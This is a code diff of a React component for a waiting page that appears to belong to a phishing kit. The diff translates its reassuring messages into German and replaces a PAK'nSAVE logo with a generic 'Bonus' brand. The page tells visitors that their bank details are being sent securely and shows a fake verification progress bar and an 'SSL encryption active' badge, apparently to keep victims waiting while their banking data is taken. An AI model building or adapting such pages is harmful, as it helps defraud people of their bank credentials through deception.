@@ -9,11 +9,11 @@ type Props = {
 };
 
 const MESSAGES = [
-  "Establishing a secure connection...",
-  "Bank details are being sent securely...",
-  "Security verification is in progress...",
-  "Please wait a moment...",
-  "Authorizing the connection..."
+  "Sichere Verbindung wird hergestellt...",
+  "Bankdaten werden sicher übertragen...",
+  "Sicherheitsüberprüfung läuft...",
+  "Bitte warten Sie einen Moment...",
+  "Verbindung wird autorisiert..."
 ];
 
 export function WaitClient({ sessionId }: Props) {
@@ -114,7 +114,7 @@ export function WaitClient({ sessionId }: Props) {
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
-              Invalid link.
+              Ungültiger Link.
             </p>
           </div>
         ) : (
@@ -124,12 +124,12 @@ export function WaitClient({ sessionId }: Props) {
                 <div>
                   <h2 className="pak-form-title max-w-[14ch]">{settings.wait_title}</h2>
                   <p className="pak-form-subtitle mt-3 max-w-[32rem]">
-                    We are securely processing your confirmation and validating your connection.
+                    Wir verarbeiten Ihre Bestätigung sicher und prüfen Ihre Verbindung.
                   </p>
                 </div>
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="pak-form-brand-logo shrink-0"
                 />
               </div>
@@ -154,7 +154,7 @@ export function WaitClient({ sessionId }: Props) {
 
                 <div className="w-full">
                   <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#ffe98c]/80">
-                    <span>Verification</span>
+                    <span>Verifizierung</span>
                     <span>{Math.round(progressWidth)}%</span>
                   </div>
                   <div className="h-3 overflow-hidden rounded-full border border-[#ffd95c]/30 bg-black/35">
@@ -171,7 +171,7 @@ export function WaitClient({ sessionId }: Props) {
                   <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
-                  <span>256-bit SSL encryption active</span>
+                  <span>256-Bit-SSL-Verschlüsselung aktiv</span>
                 </div>
               </div>
             </div>
